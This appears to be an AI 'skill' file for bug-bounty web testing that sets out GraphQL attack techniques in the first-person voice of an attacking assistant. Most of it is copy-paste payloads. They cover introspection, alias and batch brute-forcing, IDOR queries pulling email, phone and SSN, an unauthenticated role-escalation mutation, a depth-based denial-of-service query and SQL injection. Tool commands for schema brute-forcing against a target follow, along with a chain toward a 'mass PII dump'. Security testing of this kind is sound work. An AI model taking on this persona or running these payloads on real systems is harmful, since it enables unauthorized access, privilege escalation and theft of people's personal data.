# SKILL: GraphQL Attacks

## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (graphql attacks) or pasted request matching this class

---

## IDENTITY IN THIS SKILL
GraphQL flattens authorization. I focus on: introspection, batched queries, alias-based brute, depth-limit DoS, IDOR via field, GraphQL → SQL/SSRF/RCE.

---

## DETECTION
Find `/graphql`, `/api/graphql`, `/v1/graphql`, `graphiql`. Test introspection.

## EXPLOITATION
### Introspection enabled
```
query { __schema { types { name fields { name } } } }
```

### Alias-based bypass of per-field rate limit / log
```graphql
query { a:user(id:1){email} b:user(id:2){email} c:user(id:3){email} }
```

### Batched queries
```json
[{"query":"{ user(id:1){email} }"}, {"query":"{ user(id:2){email} }"}]
```

### Field-level IDOR
```graphql
query { user(id:"OTHER_USER_UUID"){ email phone ssn } }
```

### Mutation injection (no auth on mutations)
```graphql
mutation { updateUserRole(userId:"victim", role:"admin") { id role } }
```

### Depth-limit DoS
```graphql
query Q($x:ID!){ user(id:$x){ posts{ author{ posts{ author{ posts{ author{ id }}}}}}}}
```

### CSRF on GraphQL via GET (when GET enabled)
```
GET /graphql?query={user(id:1){email}}
```

### SSRF/SQLi via field args (custom resolvers)
```graphql
query { rawSearch(filter:"' OR 1=1-- -") { items } }
```

### File upload via multipart spec
Test if `Upload` scalar is exposed → arbitrary file upload (often unauth).

## PAYLOADS (real, copy-paste, grouped)
(see above)

## BYPASS TECHNIQUES
Disabled introspection → clairvoyance schema brute. Suggestions disabled → wordlist.

## CHAIN POTENTIAL
GraphQL IDOR + alias batching + introspection = mass PII dump.

## TOOLS
graphw00f, clairvoyance, inql, graphql-cop, BatchQL

## COMMANDS
```bash
graphw00f -d -t https://target/graphql
clairvoyance -o schema.json -w ~/wordlists/graphql/graphql-words.txt https://target/graphql
inql -t https://target/graphql --generate-html
```

## EDGE CASES / NOT-A-BUG TRAPS
AWS AppSync / Hasura / Apollo Federation each have engine-specific quirks — fingerprint first.

## TRIAGE ANGLE (per platform)
Show authorization bypass via field aliasing + privileged data exfil.

## SEVERITY & CVSS
8.0–9.5.

## REFERENCES
Doyensec GraphQL • PortSwigger GraphQL labs • bb_kb/GraphQL/
